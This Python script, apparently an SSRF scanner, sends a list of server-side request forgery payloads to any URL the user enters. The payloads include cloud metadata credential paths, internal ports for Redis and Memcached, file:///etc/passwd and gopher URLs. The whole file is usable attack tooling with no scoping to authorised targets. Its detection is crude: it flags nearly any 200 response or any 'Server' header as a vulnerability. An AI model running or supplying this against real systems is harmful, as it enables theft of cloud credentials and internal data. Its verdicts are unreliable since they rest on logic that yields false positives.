import requests
from urllib.parse import urlparse

# List of common and enhanced SSRF payloads
ssrf_payloads = [
    "http://localhost",
    "http://127.0.0.1",
    "http://internal-service",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2020-09-01",
    "http%3A%2F%2F127.0.0.1",
    "http://0x7f000001",
    "http://0177.0.0.1",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:11211",
    "http://127.0.0.1/admin",
    "http://127.0.0.1:8080",  # Common internal web server port
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://10.0.0.1",  # Common internal network range
    "http://192.168.0.1",  # Common internal network range
    "ftp://localhost",  # FTP protocol
    "file:///etc/passwd",  # File protocol
    "gopher://localhost"  # Gopher protocol
]

# Function to check if a URL is vulnerable to SSRF
def is_vulnerable_to_ssrf(target_url):
    headers = {
        "User-Agent": "SSRF-Tester",
        "Content-Type": "application/json"
    }

    for payload in ssrf_payloads:
        try:
            response = requests.post(target_url, json={"url": payload}, headers=headers, timeout=10)
            
            print(f"Testing payload: {payload} - Status code: {response.status_code}")

            # Detailed analysis of response content, status code, and headers
            if any(keyword in response.text for keyword in ["ami-id", "redis_version", "Unauthorized", "admin"]):
                print(f"Potential SSRF vulnerability detected with payload: {payload} (Response contains sensitive keywords)")
                return True

            if response.status_code == 200 and len(response.text) > 0:
                print(f"Potential SSRF vulnerability detected with payload: {payload} (Response status 200 with non-empty body)")
                return True

            if 'Server' in response.headers or 'X-Backend-Server' in response.headers:
                print(f"Potential SSRF vulnerability detected with payload: {payload} (Response contains server headers)")
                return True

        except requests.RequestException as e:
            print(f"Error with payload {payload}: {e}")

    return False

# Main function to take user input and test for SSRF
def main():
    target_url = input("Enter the URL to test for SSRF: ").strip()

    # Validate URL
    parsed_url = urlparse(target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print("Invalid URL. Please enter a valid URL.")
        return

    if is_vulnerable_to_ssrf(target_url):
        print(f"The URL {target_url} is potentially vulnerable to SSRF attacks.")
    else:
        print(f"The URL {target_url} does not appear to be vulnerable to SSRF attacks.")

if __name__ == "__main__":
    main()
